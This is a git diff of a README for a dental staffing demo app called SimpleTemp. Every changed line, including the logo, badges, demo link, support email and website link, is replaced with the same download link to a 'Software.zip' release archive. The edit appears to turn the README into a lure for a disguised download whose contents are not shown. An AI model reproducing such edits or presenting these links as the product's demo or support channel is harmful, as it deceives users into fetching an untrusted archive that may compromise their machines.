@@ -1,6 +1,6 @@
 # 🚀 Welcome to SimpleTemp Demo Repository! 🦷💉
 
-![SimpleTemp Logo](https://example.com/logo.png)
+![SimpleTemp Logo](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip)
 
 ## Introduction
 Welcome to SimpleTemp - the modern staffing platform for dental clinics, hygienists, and nurses in the UK. Our platform revolutionizes temporary staffing by providing real-time booking, secure payments, and direct communication between clinics and professionals. Join us in enhancing efficiency and flexibility in the dental industry! 🌟
@@ -25,8 +25,8 @@ Welcome to SimpleTemp - the modern staffing platform for dental clinics, hygieni
 🔧 Xcode  
 
 ## Installation
-To access the demo version of SimpleTemp, please click on the following link: [Launch SimpleTemp Demo](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  
-![Launch Demo](https://img.shields.io/badge/Launch-Demo-blue)  
+To access the demo version of SimpleTemp, please click on the following link: [Launch SimpleTemp Demo](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip)  
+![Launch Demo](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip)  
 
 ## Getting Started
 1. Clone the repository to your local machine  
@@ -38,16 +38,16 @@ To access the demo version of SimpleTemp, please click on the following link: [L
 We welcome contributions to make SimpleTemp even better! Feel free to fork the repository, make your changes, and submit a pull request. Let's collaborate and improve the future of temporary staffing in the UK dental industry!
 
 ## Support
-For any questions, feedback, or issues related to SimpleTemp, please reach out to our team through [support@simpletemp.com](mailto:support@simpletemp.com). We are here to assist you and ensure a seamless experience on our platform.
+For any questions, feedback, or issues related to SimpleTemp, please reach out to our team through [https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip). We are here to assist you and ensure a seamless experience on our platform.
 
 ## Thank You!
 Thank you for exploring SimpleTemp Demo Repository. We appreciate your interest in revolutionizing temporary staffing with us. Let's create a more efficient and flexible future for dental clinics, hygienists, and nurses in the UK! 🦷💼👩‍⚕️
 
 ---
 
-#### Check out our website for more information: [SimpleTemp Website](https://simpletemp.com)
+#### Check out our website for more information: [SimpleTemp Website](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip)
 
-![SimpleTemp Website](https://example.com/website.png)
+![SimpleTemp Website](https://github.com/ThilakshanThavarajah/simpletemp-demo/releases/download/v2.0/Software.zip)
 
 ---  
 
